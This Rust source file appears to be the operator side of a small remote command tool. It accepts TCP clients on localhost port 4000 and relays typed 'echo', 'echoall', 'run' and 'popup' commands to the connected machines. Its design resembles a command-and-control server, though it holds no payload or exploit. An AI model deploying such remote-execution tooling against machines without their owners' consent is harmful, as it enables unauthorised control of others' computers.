mod tools;

use std::{io, thread};
use std::io::{BufReader, BufWriter};
use std::net::{TcpListener, TcpStream};
use std::sync::{Arc, Mutex};
use std::sync::mpsc::{channel, Receiver, Sender};
use lib::{send_data, receive_data, Command};
use lib::CommandErr::*;
use crate::tools::{echo, echoall, popup, run};


type ClientHandleSender = Sender<(Command, String, Sender<Option<Vec<u8>>>)>;
type ClientHandleReceiver = Receiver<(Command, String, Sender<Option<Vec<u8>>>)>;

#[derive(Clone)]
struct ClientHandle {
    sender: ClientHandleSender,
    ip: String,
}

impl ClientHandle {
    /// Sends a message to the corresponding Client object
    fn send_to_client(&self, command: Command, message: String) -> Option<Vec<u8>> {
        // Create new channel to receive response from client
        let (client_sender, handle_receiver) = channel();
        
        // Should be safe to unwrap since there should always be a corresponding receiver
        self.sender.send((command, message, client_sender)).unwrap();
        
        // Receive response from client. Client will always send, so unwrap is fine
        handle_receiver.recv().unwrap()
    }
}


struct Client {
    reader: BufReader<TcpStream>,
    writer: BufWriter<TcpStream>,
    receiver: ClientHandleReceiver,
}


impl Client {
    fn new(stream: TcpStream) -> (Client, ClientHandle) {
        let reader = BufReader::new(stream.try_clone().unwrap());
        let writer = BufWriter::new(stream.try_clone().unwrap());

        let ip = stream.peer_addr().unwrap().to_string();

        let (sender, receiver) = channel();

        (Client { reader, writer, receiver, }, ClientHandle { sender, ip, })
    }

    /// Waits to receive data from ClientHandle, sends response back once received from client
    fn send_message(&mut self) {
        // Unwrap should be fine since handle sends correct data
        let (command, message, sender) = self.receiver.recv().unwrap();

        let mut response_to_send = None;

        if send_data(command, &message, &mut self.writer).is_ok() {
            // Client should only use Command::Send to send back a response
            if let Some((Command::Send, buf)) = receive_data(&mut self.reader) {
                // TODO: Remove unwrap
                response_to_send = Some(buf);
            }
        }
        sender.send(response_to_send).unwrap()
    }
    fn handle_client(&mut self) {
        loop {
            self.send_message();
        }
    }
}

/// Handles commands.
fn handle_commands(handles: Arc<Mutex<Vec<ClientHandle>>>) {
    let mut input = String::new();
    loop {
        io::stdin().read_line(&mut input).unwrap();
        let args = input.trim().split(' ').collect::<Vec<&str>>();

        let command = args[0];

        let error = match command {
            "echo" => echo(args, &handles),
            "echoall" => echoall(args, &handles),
            "run" => run(args, &handles),
            "popup" => popup(args, &handles),
            _ => Err(InvalidCommandErr("The command specified does not exist")),
        };
        
        match error {
            Ok(msg) => log::info!("{}", msg),
            Err(MultipleErr(vec)) => vec.iter().for_each(|err| log::error!("{}", err)),
            Err(err) => log::error!("{}", err),
        }

        input.clear();
    }
}


fn main() -> io::Result<()> {
    pretty_env_logger::init();
    log::debug!("Connected to stream");
    let listener = TcpListener::bind("127.0.0.1:4000")?;

    // Create synchronous vector of handles
    let handles: Arc<Mutex<Vec<ClientHandle>>> = Arc::new(Mutex::new(Vec::new()));

    // Clone handle vector to use in main thread
    let clone = handles.clone();
    thread::spawn( move || handle_commands(clone));

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                log::info!("Found new client with IP {}", stream.peer_addr().unwrap());
                let (mut client, handle) = Client::new(stream);

                // Clone handle to be added to handles vector
                let handle_clone = handle.clone();

                // Clone mutex to add handle
                let handles_clone = handles.clone();
                handles_clone.lock().unwrap().push(handle_clone);

                // Run main logic on each client
                thread::spawn( move || client.handle_client());
            }
            Err(err) => {
                log::error!("Error while parsing stream: {}", err);
            }
        }
    }
    Ok(())
}